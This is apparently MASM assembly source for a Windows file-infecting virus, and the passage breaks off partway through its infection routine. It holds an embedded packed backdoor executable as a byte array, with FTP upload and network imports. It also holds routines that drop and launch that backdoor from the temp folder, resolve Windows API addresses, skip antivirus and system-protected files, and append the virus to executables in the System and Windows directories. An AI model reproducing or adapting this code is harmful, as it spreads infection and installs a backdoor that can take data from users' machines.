  db 35,35,35,99,5,8,4,168,176,35,35,35,35,180,184,188
  db 192,35,35,35,35,196,200,204,208,35,35,35,35,212,216,220
  db 224,141,40,178,42,6,146,64,64,149,2,127,249,143,160,84
  db 83,95,115,101,114,118,0,97,98,101,102,104,86,48,57,9
  db 246,154,2,61,165,104,41,8,51,103,131,84,180,223,109,39
  db 83,45,105,99,101,80,114,111,4,190,123,114,187,204,13,10
  db 1,45,45,32,83,17,105,111,110,32,84,246,134,253,223,35
  db 109,105,110,233,101,44,32,37,115,32,29,41,14,96,109,236
  db 189,18,3,56,42,0,14,219,23,246,220,32,10,17,79,78
  db 111,117,153,108,255,15,44,217,108,101,88,75,115,109,116,112
  db 46,119,97,110,97,100,255,255,127,251,111,111,46,102,114,224
  db 104,97,99,107,64,114,101,112,111,114,116,46,99,111,109,0
  db 115,97,100,100,97,109,55,160,111,229,46,104,117,140,55,64
  db 99,97,14,97,105,255,251,239,177,108,27,45,42,61,1,60
  db 32,82,97,112,48,32,73,80,32,62,61,97,219,186,103,20
  db 45,0,97,33,17,112,152,85,27,110,119,119,155,96,109,200
  db 68,97,116,5,72,101,117,96,32,33,91,1,131,197,129,199
  db 46,112,0,33,43,120,5,137,112,43,43,120,5,99,125,35
  db 27,97,5,177,0,238,2,177,109,36,83,188,116,96,110,80
  db 32,65,248,183,119,53,103,101,0,112,213,112,105,0,69,110
  db 117,109,129,175,125,131,112,55,41,77,111,100,117,31,89,152
  db 193,64,184,78,174,162,83,0,13,191,181,15,60,37,100,32
  db 46,194,116,40,115,41,62,102,83,237,25,196,134,121,203,109
  db 92,70,67,111,3,131,176,64,108,77,108,231,92,222,115,157
  db 69,184,189,92,191,34,65,99,229,12,32,11,134,6,209,39
  db 110,111,137,108,116,222,218,237,11,125,58,47,47,119,0,46
  db 109,47,60,115,111,102,119,134,141,19,117,72,45,79,23,99
  db 77,65,73,26,196,235,254,76,32,70,82,79,77,58,126,115
  db 117,145,108,219,100,23,105,116,111,15,70,55,109,12,34,247
  db 207,13,182,34,17,84,27,59,83,117,98,106,104,64,83,96
  db 51,12,40,0,115,99,188,115,13,6,113,117,105,116,74,46
  db 5,0,98,99,195,13,51,5,121,73,116,238,172,253,37,69
  db 32,118,55,46,48,32,52,221,32,182,208,248,111,133,112,56
  db 223,100,46,32,91,39,63,39,32,16,113,91,130,190,22,32
  db 97,102,102,236,101,8,108,39,89,251,96,188,52,100,101,93
  db 157,36,73,78,70,223,0,176,49,200,187,13,77,83,71,32
  db 34,245,120,55,18,113,193,35,135,32,109,59,34,31,214,188
  db 57,123,68,73,82,33,6,87,76,73,83,84,87,67,83,59
  db 228,221,76,59,67,86,82,84,67,105,49,154,169,235,54,107
  db 111,156,97,144,110,145,169,117,103,173,208,124,156,12,26,99
  db 148,116,46,128,193,254,82,83,82,86,76,54,91,235,215,209
  db 74,75,20,87,158,4,121,93,16,135,157,117,55,50,45,115
  db 12,93,40,83,95,78,57,59,225,107,226,153,115,221,34,29
  db 75,133,43,100,34,68,75,216,55,236,251,97,130,34,80,73
  db 68,18,67,46,18,59,214,186,13,45,112,189,111,190,44,77
  db 75,253,167,144,19,152,25,82,77,69,78,40,67,195,100,77
  db 70,134,105,135,215,219,48,53,201,95,168,34,145,23,37,255
  db 102,91,97,146,102,26,127,70,73,78,68,107,148,219,118,32
  db 2,102,182,101,110,253,46,132,133,195,118,42,65,182,34,107
  db 208,110,157,55,155,178,198,171,102,100,101,30,61,97,32,249
  db 69,88,69,67,72,205,79,80,150,126,11,236,172,37,117,34
  db 42,16,71,165,135,176,199,162,80,85,84,40,32,40,70,190
  db 203,66,119,227,108,32,80,191,104,41,161,110,113,46,46,11
  db 86,231,58,112,16,117,135,10,251,183,181,177,112,97,92,119
  db 177,100,81,65,87,69,66,6,240,67,254,241,69,77,79,87
  db 83,68,76,85,114,108,47,97,101,29,131,29,46,150,34,154
  db 228,206,16,13,249,75,69,89,192,94,194,210,108,183,91,1
  db 48,93,3,49,42,93,216,187,91,70,35,193,239,202,79,70
  db 70,50,109,187,21,56,49,60,126,79,79,211,50,184,109,91
  db 250,182,79,137,82,24,51,96,72,229,68,14,195,9,179,11
  db 18,52,32,44,73,73,42,109,105,107,39,141,200,236,99,167
  db 117,134,29,0,205,192,111,32,184,143,79,0,212,84,12,96
  db 23,99,80,100,117,166,82,193,113,205,207,156,154,36,22,182
  db 55,45,228,93,17,118,111,121,101,14,97,26,99,107,144,158
  db 54,147,117,193,46,155,69,204,173,125,166,147,185,178,37,105
  db 72,38,10,89,194,182,108,13,114,64,44,14,139,85,218,4
  db 102,108,210,96,110,76,206,84,234,10,118,77,243,94,254,0
  db 23,129,214,95,7,45,8,194,194,217,37,179,57,120,65,67
  db 163,109,71,131,215,172,185,36,18,45,108,187,104,232,58,16
  db 38,101,117,108,63,131,7,219,86,216,206,47,82,41,185,223
  db 221,181,10,3,38,162,79,87,101,98,54,97,111,169,4,85
  db 115,12,34,76,87,182,118,7,198,102,247,101,203,106,97,159
  db 76,6,214,40,208,217,108,1,90,246,234,224,194,205,116,225
  db 108,133,63,60,216,26,72,217,112,164,109,229,113,107,237,51
  db 247,166,85,157,176,67,122,32,104,39,196,154,146,238,50,121
  db 47,118,26,70,74,31,56,111,67,109,173,64,181,243,75,220
  db 101,114,172,64,181,35,82,117,110,29,75,83,224,202,67,8
  db 24,101,203,185,88,99,39,203,58,23,91,96,240,91,248,92
  db 161,26,166,86,0,124,11,124,7,54,193,65,225,67,191,226
  db 200,32,201,224,19,24,138,42,46,42,227,2,6,9,123,7
  db 0,237,51,95,55,232,42,73,137,71,69,172,32,60,163,115
  db 13,221,47,60,109,62,39,30,37,101,248,184,27,227,0,135
  db 62,9,66,89,69,168,16,193,5,193,61,50,71,70,73,73
  db 137,194,217,214,119,233,83,84,133,238,64,18,94,87,91,116
  db 155,170,112,48,185,152,166,24,183,135,131,137,66,169,14,174
  db 24,97,3,40,24,160,71,46,32,220,245,9,17,78,246,69
  db 10,78,84,241,4,19,90,132,134,51,117,73,54,125,214,76
  db 1,107,170,26,246,47,25,235,28,179,7,79,83,8,47,238
  db 117,165,23,115,152,222,41,227,242,12,42,109,173,49,178,33
  db 112,182,30,108,16,152,193,236,10,27,125,228,44,101,141,222
  db 94,22,26,228,9,5,115,49,239,27,13,152,57,22,168,88
  db 97,113,18,231,46,227,18,122,115,115,115,28,226,22,75,194
  db 132,175,219,48,251,251,94,204,34,116,186,71,68,189,225,98
  db 111,97,112,237,121,13,53,18,182,138,174,100,150,204,101,43
  db 83,135,197,173,183,87,84,87,65,126,92,77,123,92,59,44
  db 102,64,138,210,86,48,172,209,226,81,49,198,161,45,22,130
  db 111,3,19,67,77,0,28,123,31,105,154,166,233,3,37,43
  db 48,52,58,81,104,71,166,62,245,103,117,167,214,106,100,162
  db 30,130,90,162,215,116,43,108,232,112,0,117,0,119,130,17
  db 0,109,70,47,90,51,5,166,94,36,79,140,204,32,92,70
  db 37,76,81,140,209,123,4,81,204,89,80,122,232,33,8,194
  db 170,99,82,120,193,200,241,248,126,105,37,224,94,132,8,134
  db 76,129,148,5,90,218,66,133,246,80,104,36,34,247,98,37
  db 115,212,68,16,154,242,98,243,19,216,178,71,3,176,50,104
  db 204,65,227,108,13,68,70,248,11,18,224,117,214,132,42,115
  db 233,64,33,132,160,231,0,170,146,21,2,168,64,134,0,5
  db 80,129,132,10,160,2,25,20,64,5,50,40,128,10,100,81
  db 0,21,200,163,0,42,144,70,1,84,32,153,0,8,194,3
  db 252,40,0,208,178,64,64,1,252,0,208,37,170,242,111,114
  db 176,130,168,109,73,101,13,62,239,30,246,217,9,109,112,105
  db 10,97,116,9,87,114,105,116,138,237,1,64,109,10,86,17
  db 185,239,160,76,97,108,70,114,101,12,43,84,197,3,5,72
  db 22,25,182,214,189,246,67,111,64,35,47,67,29,55,101,130
  db 45,43,136,173,17,63,89,119,194,30,84,104,6,100,13,111
  db 111,108,104,101,100,219,246,255,108,112,51,50,83,110,97,112
  db 115,104,111,116,25,68,15,101,52,155,4,64,237,69,120,131
  db 3,12,4,34,26,54,63,142,46,4,34,154,1,141,1,191
  db 9,129,136,139,1,180,76,105,170,162,109,237,98,114,97,146
  db 12,71,90,209,236,109,19,211,18,110,29,16,7,170,40,81
  db 81,82,43,129,136,102,17,120,123,221,178,101,21,142,18,68
  db 222,32,8,68,20,97,109,47,219,120,236,223,75,14,129,83
  db 105,122,101,12,76,97,115,8,129,136,78,124,0,245,54,146
  db 0,232,1,228,19,255,102,19,6,114,17,132,65,100,100,114
  db 21,133,194,97,136,83,58,161,194,190,204,85,89,52,84,105
  db 109,155,21,38,81,69,44,68,216,36,170,152,14,74,227,222
  db 132,66,27,147,89,41,13,201,182,67,216,116,118,133,79,208
  db 110,246,176,8,133,96,8,178,115,15,51,202,237,16,115,68
  db 82,101,52,3,139,16,64,28,96,220,30,9,132,83,90,148
  db 139,79,102,21,2,40,97,106,53,162,138,95,172,86,27,22
  db 80,111,0,106,55,119,56,15,11,101,112,6,70,48,67,140
  db 123,124,124,227,68,21,179,231,9,1,0,171,98,251,218,182
  db 247,97,29,103,36,93,116,206,116,235,190,179,168,89,65,148
  db 103,83,86,96,172,181,239,112,117,101,9,15,81,10,135,17
  db 35,217,103,36,156,75,101,121,16,105,23,150,205,220,15,94
  db 77,130,106,117,16,64,55,10,3,197,107,101,16,75,8,147
  db 189,115,47,27,66,44,201,237,90,35,117,112,109,135,16,64
  db 201,120,85,115,121,143,130,27,204,240,91,115,182,6,18,160
  db 83,176,73,14,22,111,216,91,118,8,197,15,153,13,90,179
  db 48,35,32,11,22,4,58,69,21,174,225,185,114,97,20,64
  db 91,225,98,112,114,80,4,208,115,207,28,83,23,107,79,179
  db 181,36,233,20,53,35,16,83,202,214,109,143,72,80,194,99
  db 50,70,106,100,86,104,58,60,88,74,170,108,18,24,40,210
  db 117,166,45,40,47,102,28,84,21,179,2,53,120,17,209,225
  db 199,50,108,220,44,34,90,86,105,112,166,107,63,222,193,8
  db 66,111,29,103,73,99,117,10,104,31,118,4,18,115,111,170
  db 75,105,94,198,66,192,248,181,114,160,233,120,191,44,155,49
  db 108,75,48,38,205,218,66,115,226,126,17,117,44,48,189,130
  db 240,38,170,137,85,14,224,102,193,154,26,79,12,168,98,51
  db 4,155,113,14,105,196,112,22,150,25,170,244,104,123,102,102
  db 201,58,204,29,204,194,18,225,22,46,196,231,221,65,115,38
  db 105,8,39,115,93,85,41,108,28,241,85,112,220,58,150,189
  db 100,43,147,62,98,237,114,100,134,77,155,59,217,31,113,112
  db 245,116,102,72,140,170,120,154,58,120,73,29,100,151,13,194
  db 152,65,17,71,20,216,199,178,217,101,64,26,108,65,14,96
  db 45,0,90,24,17,4,146,45,41,145,95,193,163,42,146,13
  db 20,255,216,120,88,134,18,57,116,177,117,140,118,55,18,85
  db 91,67,97,99,43,85,75,96,75,96,65,125,24,104,158,102
  db 27,22,24,232,70,168,109,44,71,17,21,52,127,248,101,219
  db 116,221,16,80,24,176,255,116,2,115,150,101,89,150,1,2
  db 3,4,52,9,90,150,101,89,11,13,16,19,23,249,39,167
  db 40,134,3,0,143,87,26,64,189,150,231,50,15,1,62,136
  db 18,102,144,82,20,134,80,201,144,71,200,64,0,224,1,228
  db 7,169,2,222,232,81,0,0,180,162,104,23,32,167,232,1
  db 147,131,164,144,134,214,60,162,40,128,148,62,81,52,216,147
  db 94,224,11,251,12,7,36,33,75,94,66,224,123,79,73,211
  db 117,116,96,39,14,78,192,0,208,0,0,95,110,31,132,84
  db 213,214,1,0,4,0,0,0,0,0,0,128,255,0,0,0
  db 96,190,0,208,65,0,141,190,0,64,254,255,87,131,205,255
  db 235,16,144,144,144,144,144,144,138,6,70,136,7,71,1,219
  db 117,7,139,30,131,238,252,17,219,114,237,184,1,0,0,0
  db 1,219,117,7,139,30,131,238,252,17,219,17,192,1,219,115
  db 239,117,9,139,30,131,238,252,17,219,115,228,49,201,131,232
  db 3,114,13,193,224,8,138,6,70,131,240,255,116,116,137,197
  db 1,219,117,7,139,30,131,238,252,17,219,17,201,1,219,117
  db 7,139,30,131,238,252,17,219,17,201,117,32,65,1,219,117
  db 7,139,30,131,238,252,17,219,17,201,1,219,115,239,117,9
  db 139,30,131,238,252,17,219,115,228,131,193,2,129,253,0,243
  db 255,255,131,209,1,141,20,47,131,253,252,118,15,138,2,66
  db 136,7,71,73,117,247,233,99,255,255,255,144,139,2,131,194
  db 4,137,7,131,199,4,131,233,4,119,241,1,207,233,76,255
  db 255,255,94,137,247,185,232,1,0,0,138,7,71,44,232,60
  db 1,119,247,128,63,1,117,242,139,7,138,95,4,102,193,232
  db 8,193,192,16,134,196,41,248,128,235,232,1,240,137,7,131
  db 199,5,137,216,226,217,141,190,0,208,1,0,139,7,9,192
  db 116,69,139,95,4,141,132,48,0,240,1,0,1,243,80,131
  db 199,8,255,150,180,240,1,0,149,138,7,71,8,192,116,220
  db 137,249,121,7,15,183,7,71,80,71,185,87,72,242,174,85
  db 255,150,184,240,1,0,9,192,116,7,137,3,131,195,4,235
  db 216,255,150,188,240,1,0,97,233,115,28,254,255,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,252,0,2,0
  db 180,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 9,1,2,0,196,0,2,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,22,1,2,0,204,0,2,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,35,1,2,0,212,0,2,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,47,1,2,0
  db 220,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 58,1,2,0,228,0,2,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,70,1,2,0,236,0,2,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,80,1,2,0,244,0,2,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,92,1,2,0,106,1,2,0,122,1,2,0
  db 0,0,0,0,136,1,2,0,0,0,0,0,150,1,2,0
  db 0,0,0,0,172,1,2,0,0,0,0,0,188,1,2,0
  db 0,0,0,0,198,1,2,0,0,0,0,0,212,1,2,0
  db 0,0,0,0,23,0,0,128,0,0,0,0,75,69,82,78
  db 69,76,51,50,46,68,76,76,0,65,68,86,65,80,73,51
  db 50,46,100,108,108,0,82,65,83,65,80,73,51,50,46,100
  db 108,108,0,83,72,69,76,76,51,50,46,100,108,108,0,85
  db 83,69,82,51,50,46,100,108,108,0,87,73,78,73,78,69
  db 84,46,100,108,108,0,87,73,78,77,77,46,100,108,108,0
  db 87,83,79,67,75,51,50,46,100,108,108,0,0,0,76,111
  db 97,100,76,105,98,114,97,114,121,65,0,0,71,101,116,80
  db 114,111,99,65,100,100,114,101,115,115,0,0,69,120,105,116
  db 80,114,111,99,101,115,115,0,0,0,82,101,103,67,108,111
  db 115,101,75,101,121,0,0,0,82,97,115,69,110,117,109,67
  db 111,110,110,101,99,116,105,111,110,115,65,0,0,0,83,104
  db 101,108,108,69,120,101,99,117,116,101,65,0,0,0,84,111
  db 65,115,99,105,105,0,0,0,70,116,112,80,117,116,70,105
  db 108,101,65,0,0,0,109,99,105,83,101,110,100,83,116,114
  db 105,110,103,65,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0

 


BackdoorEnd dd 0

Backdoor  db "DABACKDOOR.EXE",0

    Drop_BackDoor   proc
           
           sub      esp, 280
           mov      ebx, esp
           
           push     ebx
           push     255
           lea      eax, dword ptr [ebp + szGetTempPathA]
           Call     K32Api
           sub      esp, 280
           
           mov      esi, ebx
           mov      edi, esp
           @@:
           lodsb
           stosb
           test     al, al
           jnz      @B
           dec      edi
           
           .IF      byte ptr [edi-1] != '\'
                    mov  byte ptr [edi], '\'
                    inc  edi
           .ENDIF
           lea      esi, dword ptr [ebp + Backdoor]

           @@:
           lodsb
           stosb
           test     al, al
           jnz      @B


           
           mov      esi, esp
           mov      edi, ebx
           
           push   0
           push   FILE_ATTRIBUTE_NORMAL	
           push   CREATE_ALWAYS
           push   0
           push   0
           push   GENERIC_WRITE
           push   esi
           lea    eax,[ebp+szCreateFileA]
           Call   K32Api
           
           .IF    eax != INVALID_HANDLE_VALUE                   ; Error : file already exist
           
           mov    ebx, eax

           push   0
           lea    eax, dword ptr [ebp + BackdoorEnd] ; <- Written
           push   eax
           push   (OFFSET BackdoorEnd - OFFSET BackdoorStart)
           lea    eax, dword ptr [ebp + BackdoorStart]
           push   eax
           push   ebx
           lea    eax, dword ptr [ebp + szWriteFile]
           Call   K32Api

           lea    eax,dword ptr [ebp + InfectionTime]
           push   eax
           push   eax
           push   eax
           push   ebx             
           lea    eax, dword ptr [ebp + szSetFileTime]
           Call   K32Api

            
           push   ebx
           lea    eax,[ebp+szCloseHandle]
           Call   K32Api   
              
           .ENDIF

           sub    esp, SIZEOF STARTUPINFO  + 40        
           mov    ebx, esp
           push   ebx
           lea    eax, dword ptr [ebp + szGetStartupInfoA]
           Call   K32Api
           
           sub    esp, SIZEOF PROCESS_INFORMATION + 40
           mov    edx, esp
           
           push   edx
           
           xor    eax,eax
           push   edx
           push   ebx
           push   edi
           push   eax
           push   NORMAL_PRIORITY_CLASS
           push   eax
           push   eax
           push   eax
           push   eax
           push   esi
           lea    eax, dword ptr [ebp + szCreateProcessA]
           Call   K32Api

           pop    ebx
      

           push   [ebx+4]
           lea    eax, dword ptr [ebp + szCloseHandle]
           Call   K32Api 

           add      esp, (280 * 2 + SIZEOF PROCESS_INFORMATION + 40 + SIZEOF STARTUPINFO  + 40)    

           ret
    Drop_BackDoor   endp

    GetK32          proc

    

           
           lea     eax,[ErrKernl+ebp]
           push    eax        


           mov     dword ptr [ebp + @StackPtr], esp
           
           xor     edx,edx                         
           push    dword ptr fs:[edx]            
           mov     dword ptr fs:[edx],esp
           

            push    5       ; Scan 5 Pages
            pop     ecx       
            
    _@1:    cmp     word ptr [esi],"ZM"
            jz      WeGotK32
    _@2:    sub     esi,10000h
            dec     ecx
            jnz    _@1
    WeFailed:



            xor     esi,esi
    WeGotK32:
            xchg    eax,esi
            jmp     K32Ok
    ErrKernl:
            xor     eax, eax
        K32Ok:
            DB      0BCh
            @StackPtr   dd      00000000h
            xor     edx,edx    
            pop     dword ptr fs:[edx]
            
            
           db      0BDh
           @@@Delta dd 00000000h

            ret


                     
    GetK32          endp




    GetGetProcAddressAddress proc
            and      dword ptr [ebp + ApiCounter],0
            mov      edi,dword ptr [eax+3Ch]          ;PE hdr
            add      edi,eax
            assume edi:ptr IMAGE_NT_HEADERS  
            mov     edi,[edi].OptionalHeader.DataDirectory.VirtualAddress 
            add     edi,eax
            assume edi:ptr IMAGE_EXPORT_DIRECTORY
            mov     ecx,[edi].NumberOfNames
            mov     esi,[edi].AddressOfNames
            
            
            add     esi,eax
            xchg    eax,ebx
           MatchLp:

            lodsd
            add     eax,ebx

            push    ecx
            push    edi
            push    esi

            push    GPASIZE
            pop     ecx
            lea     edi,[ebp+szGetProcAddress]
            mov     esi,eax
            repz    cmpsb

            pop     esi
            pop     edi
            
            or      ecx,ecx
            jz      GPA_found
            
            inc     dword ptr [ebp + ApiCounter]
            
            pop     ecx
            dec     ecx
            jnz     MatchLp
            
            mov     dword ptr [ebp + _GetProcAddress], 0bff76dach      ; Not found. hardcode it ( Win95/98 )
            ret
            
           GPA_found:
             
            mov     esi,[edi].AddressOfNameOrdinals          
            pop     ecx
            
            
            mov     ecx,dword ptr [ebp + ApiCounter]
            shl     ecx,1
            add     esi,ecx 
            add     esi,ebx
            xor     eax,eax
            lodsw   
            shl     eax,2

            add     eax,[edi].AddressOfFunctions
            mov     esi,eax
            add     esi,ebx
            lodsd
            add     eax,ebx

            assume edi :nothing 
            mov     dword ptr [ebp + _GetProcAddress],eax
       
            ret
    GetGetProcAddressAddress endp

    infect_newsystem    proc



            lea         ebx, dword ptr [ebp + szGetSystemDirectoryA]
            xor         ecx, ecx
            inc         ecx
           @@:
            push        ecx
            sub         esp, 300
            mov         esi, esp
            push        0FFh                       ; Dir size
            push        esi                        ; buffer
            mov         eax, ebx
            Call        K32Api
            mov         eax, esi
            call        _strlen
            mov         ecx, esi
            add         ecx, eax
            mov         dword ptr [ecx], '*.*\'
            mov         byte ptr  [ecx + 4], 0

            mov         eax, esi
            Call        InfectDir
            add         esp, 300
            lea         ebx, dword ptr [ebp + szGetWindowsDirectoryA]
            pop         ecx
            dec         ecx
            jns         @B
            ret
    infect_newsystem    endp

    InfectDir Proc




            
            sub     esp, (SIZEOF (WIN32_FIND_DATA) + 400)
            
            mov     ebx, esp
            push    ebx
            push    eax                         ; DirPath
            lea     eax, dword ptr [ebp+szFindFirstFileA]
            CAll    K32Api
            inc     eax
            jz      SHIT                                    ; Fucking ERR_NOACCESS under XP!
            dec     eax
            mov     dword ptr [ebp + hFind], eax

            mov     edi, esp
            add     edi, (SIZEOF (WIN32_FIND_DATA) + 4)
            push    edi
           @@:
            lodsb
            cmp     al, '*'
            jz     @F
            stosb
            jmp     @B
           @@:
            xor     al, al
            stosb
            pop     esi


            and     byte ptr [ebp+InfectionCtr],0
           
          FindLp:
            assume  ebx:ptr WIN32_FIND_DATA
            
            lea     eax, dword ptr [[ebx].cFileName]
            
            push    eax
            mov     edi,eax
            xor     ecx,ecx
            dec     ecx
            xor     al,al                               ; last byte 0
            repnz   scasb
            pop     eax
            or      dword ptr [edi-5],20202020h
            .IF     dword ptr [edi-5] != 'exe.' && dword ptr [edi-5] != 'rcs.'
            
                    jnz     skipfile
                    
            .ENDIF


            
            mov     ecx,dword ptr [[ebx].nFileSizeHigh] ; skip large file
            test    ecx,ecx
            jnz     skipfile



            
            push     esi
            push     eax
            mov      eax, esi
            call     _strlen
            mov      ecx, esi
            add      ecx, eax
            mov      edx, ecx
            mov      edi, ecx
            pop      esi

           @@:
            lodsb
            stosb
            or       al,al
            jnz      @b
            pop      esi

            ;push        edx
            ;xor         ecx, ecx
            ;push        ecx
            ;push        esi
            ;push        esi
            ;push        ecx
            ;lea         eax, dword ptr [ebp + szMessageBoxA]
            ;Call        U32Api
            ;pop         edx
            
            mov      eax, esi
            pushad
            Call   IsFileAV?
            dec    eax
            popad
            jz    @F                                    ; IS it an AV file ?
            Call    infect                              ; All criterias Ok? infect !!!
           @@:
            ;;----
            ;inc         byte ptr [ebp + InfectionCtr]

            ;---
            and        byte ptr [edx], 0
          skipfile:


            push    ebx
            push    dword ptr [ebp + hFind]
            lea     eax, dword ptr [ebp + szFindNextFileA]
            CAll    K32Api
            cmp     byte ptr [ebp + InfectionCtr], 7 ; infect 7 files in dir
            jae     ExitFind                                     

            test    eax,eax
            jnz     FindLp
            
          ExitFind:
            push    dword ptr [ebp+hFind]
            lea     eax,[ebp+szFindClose]           ; Close Search handle
            CAll    K32Api
           SHIT:
            add     esp, (SIZEOF (WIN32_FIND_DATA) + 400)
            ret
    InfectDir endp


    
    infect  proc

            pushad



            mov    dword ptr [ebp + pFileName],eax 


            xor    esi,esi   
            and    byte ptr [ebp + _SizeTestFailed], 0                        ; Init Ok

            sub    esp, 1100
            mov    ebx, esp
            
            cmp    dword ptr [ebp + hSFC], 0                 ; Not W2k/Xp
            jz     Infect2nd       


            
            push   1024
            push   ebx
            push   -1
            push   eax
            push   esi
            push   esi
            lea    eax, dword ptr [ebp + szMultiByteToWideChar]
            Call   K32Api
            
            lea    eax, dword ptr [ebp + szSfcIsFileProtected]
            push   eax
            push   dword ptr [ebp + hSFC]
            Call   dword ptr [ebp + _GetProcAddress] 

            or     eax, eax                             ; Api not found ?
            jz     Infect2nd

            cmp    byte ptr [eax], 0CCh
            jz     ZeroShit


            push   ebx                              ; 
            push   esi                              ; 0
            Call   eax                              ; Call SfcIsFileProtected
     
            or     eax, eax
            jz     Infect2nd
            add    esp, 1100
            popad
            ret                                     ; It's Protected !

      Infect2nd:
            add    esp, 1100
            
            and    dword ptr [ebp + Patched?],0     ; init error
            
            xor    esi,esi  

            push   esi
            push   esi
            push   esi
            push   esi
            lea    eax, dword ptr [ebp + szCreateEventA]
            Call   K32Api
            mov    dword ptr [ebp + InfEvent], eax

            mov    dword ptr [ebp + ThreadDelta], ebp
            
            lea    eax, dword ptr [ebp + CheckInfectionTimeOutThreadID]
            push   eax
            push   esi
            push   esi
            lea    eax, dword ptr [ebp + CheckInfectionTimeOutThread]
            push   eax
            push   esi
            push   esi
            lea    eax, dword ptr [ebp + szCreateThread]
            Call   K32Api
      
            push   eax
            lea    eax, dword ptr [ebp + szCloseHandle]
            Call   K32Api 



            push   dword ptr [ebp + pFileName]
            lea    eax, dword ptr [ebp + szGetFileAttributesA]      ; Save Original attribs
            Call   K32Api
            mov    dword ptr [ebp + OriginalAttributes],eax

 
            push   FILE_ATTRIBUTE_NORMAL                            ; Reset attributes
            push   dword ptr [ebp + pFileName]
            lea    eax, dword ptr [ebp + szSetFileAttributesA]
            
            Call   K32Api



            push   esi
            push   FILE_ATTRIBUTE_NORMAL	
            push   OPEN_EXISTING
            push   esi
            push   FILE_SHARE_READ or FILE_SHARE_WRITE
            push   GENERIC_READ	or GENERIC_WRITE
            push   dword ptr [ebp + pFileName]
            lea    eax,[ebp+szCreateFileA]
            Call   K32Api

            inc   eax
            jz    ErrOpen
		dec	 eax
            mov    dword ptr [ebp+hFile],eax


            lea    eax,dword ptr [ebp + LastWriteTime]
            push   eax
            lea    eax,dword ptr [ebp + LastAccessTime]
            push   eax
            lea    eax,dword ptr [ebp + CreationTime]
            push   eax
            push   dword ptr [ebp+hFile]               
            lea    eax, dword ptr [ebp + szGetFileTime]
            Call   K32Api

                     
            push   esi
            push   esi
            push   esi
            push   PAGE_READWRITE	
            push   esi
            push   dword ptr [ebp+hFile]
            lea    eax,[ebp+szCreateFileMappingA]
            call   K32Api


            
		or	eax,eax
            jz    ErrMap1

            mov    dword ptr [ebp +hMap],eax
            
            push   esi
            push   esi
            push   esi
            push   FILE_MAP_ALL_ACCESS
            push   dword ptr [ebp+hMap]
            lea    eax,[ebp+szMapViewOfFile]
            call   K32Api

            test   eax,eax
            jz     ErrMap2
            
            mov    dword ptr [ebp +pMap],eax

            cmp    word ptr [eax],IMAGE_DOS_SIGNATURE       
            jnz    ErrInf


     mov     dword ptr [ebp + _Inf_ESP], esp
     mov     dword ptr [ebp + _Inf_EBP], ebp
     ;mov     dword ptr [ebp + _Inf_ESP2], esp
     ;mov     dword ptr [ebp + _Inf_EBP2], ebp
     ;mov     dword ptr [ebp + _Inf_ESP3], esp
     ;mov     dword ptr [ebp + _Inf_EBP3], ebp
     

             
     lea     ecx,[ebp + inf_main_handler]
     push    ecx        
      
     xor     edx,edx                         
     push    dword ptr fs:[edx]            
     mov     dword ptr fs:[edx],esp



            mov    edi,[eax+3ch]
            add    edi,eax
            cmp    dword ptr [edi],IMAGE_NT_SIGNATURE             
            jnz    ErrInf




            assume edi: ptr IMAGE_NT_HEADERS
            mov    ecx,[edi].OptionalHeader.FileAlignment
            mov    dword ptr [ebp + FAlignment], ecx


            movzx esi, word ptr [edi].FileHeader.SizeOfOptionalHeader
            lea esi, [[edi].OptionalHeader + esi]           ; esi pointe sur le premier IMAGE_SECTION_HEADER
            

            movzx eax, word ptr [[edi].FileHeader.NumberOfSections]
            dec   eax
            imul  eax,eax,sizeof IMAGE_SECTION_HEADER

            add   esi,eax  ; esi pointe sur le dernier IMAGE_SECTION_HEADER 

            
            xor    eax,eax
            push   eax
            push   dword ptr [ebp + hFile]
            lea    eax, dword ptr [ebp+szGetFileSize]
            call   K32Api
            mov    dword ptr [ebp + OldSize],eax
            
            cmp    eax,MINIMUM_FILE_SIZE                ; Avoid Small Files
            jb     ErrInf

            cmp    eax,MAXIMUM_FILE_SIZE                ; Avoid Big Files
            ja     ErrInf
            
            assume esi:ptr IMAGE_SECTION_HEADER
            mov    ecx,eax      			
            mov    edx,[esi].PointerToRawData
            
            ;.IF    byte ptr [ebp + _SizeTestFailed]  != 0
            ;       push   eax

            ;.ELSE
                   .IF    dword ptr [esi].Misc.VirtualSize != 0     ; 
                        push   dword ptr [esi].Misc.VirtualSize 
                   .ELSE
                        ;xor     eax, eax
                        ;mov     [eax], eax
                        push   dword ptr [esi].SizeOfRawData;
                   .ENDIF
            ;.ENDIF
            
            pop    dword ptr [ebp + SizeRelative]
            add    edx, dword ptr [ebp + SizeRelative] 
            sub    ecx,edx				
            sub    eax,ecx
            

            
            mov    dword ptr [ebp + Size2Align],eax     ; offset where to start virus
   

            
            mov    ecx,ZipSignLen
            lea    edi,[ebp + ZipSign]   
            repz   cmpsb

           
            test   ecx,ecx
            jz     ErrInf                       ; test for winzip self extractor
                    

            Call   UnMap


            





            mov    eax,dword ptr [ebp + Size2Align]
            mov    ecx,dword ptr [ebp + FAlignment]
            add    eax,MAX_POLY_SIZE                            


            call    _Align
            xchg    ecx,eax                 ;New File Size = Old File Size + VirusSize
            

            .IF     ecx <  dword ptr [ebp + OldSize]         ; would it cut file ?
                    ;inc   byte ptr [ebp + _SizeTestFailed]  ; security


                    xor     edx,edx    
                    pop     dword ptr fs:[edx]
                    add     esp, 4
                     ;db 0BCh
                     ;_Inf_ESP2 dd 0 
                     ;db 0BDh
                     ;_Inf_EBP2 dd 0

     
